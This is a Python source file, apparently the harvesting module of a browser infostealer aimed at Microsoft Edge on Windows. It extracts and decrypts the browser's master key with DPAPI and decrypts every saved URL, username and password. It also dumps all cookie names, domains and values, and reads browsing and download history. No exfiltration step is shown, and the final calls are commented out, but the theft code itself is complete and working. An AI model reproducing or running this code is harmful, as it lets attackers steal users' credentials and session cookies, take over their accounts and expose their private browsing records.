import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
import shutil
from Cryptodome.Cipher import AES
import browser_cookie3
import datetime

class MicrosoftEdge:
    def __init__(self):
        self.default_path=["C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                             "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"]
        self.home_path = os.environ['USERPROFILE']+"\\AppData\\Local\\Microsoft\\Edge\\User Data"
        
    def get_edge_install(self):
        for path in self.default_path:
            if os.path.exists(path):
                return True
        return False
    
    def edge_date_time(self,timestamp):
        dt_object = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
        return dt_object
    
    def convert_size(self,size_bytes):
        suffixes = ['B', 'KB', 'MB', 'GB']
        suffix_index = 0
        size = float(size_bytes)
        while size >= 1024 and suffix_index < len(suffixes) - 1:
            size /= 1024
            suffix_index += 1
        return f"{size:.2f} {suffixes[suffix_index]}"
    
    def get_encrypted_key(self):  
        try:
            if self.get_edge_install():
                with open(os.path.normpath(self.home_path + "\Local State"), "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            return f"{str(e)}\n[E] Couldn't extract encrypted_key!"
        
    def decrypt_password(self,ciphertext, encrypted_key):
        try:
            chrome_secret = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(encrypted_key, AES.MODE_GCM, chrome_secret)
            return cipher.decrypt(encrypted_password).decode()
        except Exception as e:
            return f"{str(e)}\n[E] Couldn't decrypt password. Is Chromium version older than 80?"
        
    def get_db(self,login_data_path):
        try:
            shutil.copy2(login_data_path, "login_data_copy.db")
            return sqlite3.connect("login_data_copy.db")
        except Exception as e:
            return f"{str(e)}\n[E] Couldn't find the \"Login Data\" database!"
        
    def get_edge_creds(self):
        try:
            if self.get_edge_install():
                credentials = ""
                if (os.path.exists(self.home_path) and os.path.exists(self.home_path + r"\Local State")):
                    result =f"[I] Found {os.environ['USERPROFILE']}'s Microsoft Edge folder - decrypting..."
                    encrypted_key = self.get_encrypted_key()
                    folders = [item for item in os.listdir(self.home_path) if re.search("^Profile*|^Default$", item) != None]
                    for folder in folders:
                        # Get data from the Login Data file (SQLite database)
                        login_data_path = os.path.normpath(fr"{self.home_path}\{folder}\Login Data")
                        db = self.get_db(login_data_path)
                        if (encrypted_key and db):
                            cursor = db.cursor()
                            cursor.execute("select action_url, username_value, password_value from logins")
                            for index, login in enumerate(cursor.fetchall()):
                                url = login[0]
                                username = login[1]
                                ciphertext = login[2]
                                if (url != "" and username != "" and ciphertext != ""):
                                    decrypted_pass = self.decrypt_password(ciphertext, encrypted_key)
                                    # message = str(index) + " " + ("=" * 50+"\n")
                                    message = f"URL: {url}\n"
                                    message += f"Username: {username}\n"
                                    message += f"Password: {decrypted_pass}\n\n"
                                    credentials += message 
                        # Remove the temporary file
                        cursor.close()
                        db.close()
                        os.remove("login_data_copy.db")
                return  credentials
        except Exception as e:
            return e
        
    def edge_cookies(self):
        try:
            if self.get_edge_install():
                cookies_data = ""
                cookies = list(browser_cookie3.edge())
                for cookie in cookies:
                    data_cookies = f"Cookies Name: {cookie.name} \n"
                    data_cookies += f"Cookies domain : {cookie.domain} \n"
                    data_cookies += f"Cookies Values : {cookie.value} \n"
                    data_cookies += f"Cookies expires : {cookie.expires} \n\n"
                    cookies_data += data_cookies   
                return cookies_data
        except Exception as e:
            return e
    def get_path(self, file):
        try:
            for filename in os.listdir( self.home_path):
                profile_path = os.path.join( self.home_path, filename)
                if os.path.isdir(profile_path):
                    logins_path = os.path.join(profile_path, file)
                    if os.path.isfile(logins_path):
                        return logins_path
            return None
        except Exception as e:
            print(e)
    def edge_history(self):
        try:
            historical=""
            history_path= self.get_path("History")
            if history_path:
                new_data = shutil.copy2(history_path,"history.db")
                conn = sqlite3.connect(new_data)
                curs = conn.cursor()
                curs.execute("SELECT url, title, last_visit_time From urls")
                resluts=curs.fetchall()
                for result in resluts:
                    # print(result)
                    hist= f"Url: {result[0]}\n"
                    hist+= f"Title: {result[1]}\n"
                    visit_time = self.edge_date_time(result[2])
                    hist+= f"Visite Time: { visit_time}\n\n"
                    historical +=hist
                curs.close()
                conn.close()
                os.unlink("history.db")
                return  (historical.replace('\n','\n\n')).encode('utf-8').split(b'\n\n')
        except Exception as e:
            print(e)
            
    def edge_downloads(self):
        try:
            historical=""
            history_path= self.get_path("History")
            if history_path:
                new_data = shutil.copy2(history_path,"history.db")
                conn = sqlite3.connect(new_data)
                curs = conn.cursor()
                curs.execute("SELECT current_path, target_path, start_time,end_time, received_bytes,total_bytes,referrer,tab_url,tab_referrer_url,last_modified,mime_type,original_mime_type  FROM downloads")
                resluts=curs.fetchall()
                # print(resluts)
                for result in resluts:
                    # print(result)
                    hist= f"Current Path: {result[0]}\n"
                    hist+= f"Target Path: {result[1]}\n"
                    hist+= f"Start Time: {self.edge_date_time(result[2])}\n"
                    hist+= f"End Time: {self.edge_date_time(result[3])}\n"
                    hist+= f"Receieved Data: {self.convert_size(result[4])}\n"
                    hist+= f"Total Data: {self.convert_size(result[5])}\n"
                    hist+= f"Referrer web: {result[6]}\n"
                    hist+= f"Tab Url: {result[7]}\n"
                    hist+= f"Tab Referrer Urls: {result[8]}\n"
                    hist+= f"Last Modified: {result[9]}\n"
                    hist+= f"Mime Type: {result[10]}\n"
                    hist+= f"Original Mime Type: {result[11]}\n\n"

                    historical +=hist
                
                curs.close()
                conn.close()
                os.unlink("history.db")
                return  (historical.replace('\n','\n\n')).encode('utf-8').split(b'\n\n')
        except Exception as e:
            print(e)
            
edge_browser = MicrosoftEdge()
# print(edge_browser.get_edge_creds())
# edge_password_lines = [line for line in  edge_browser.get_edge_creds() if not line.startswith("Password")]
# print(edge_password_lines)
# # print(edge_browser.edge_downloads())

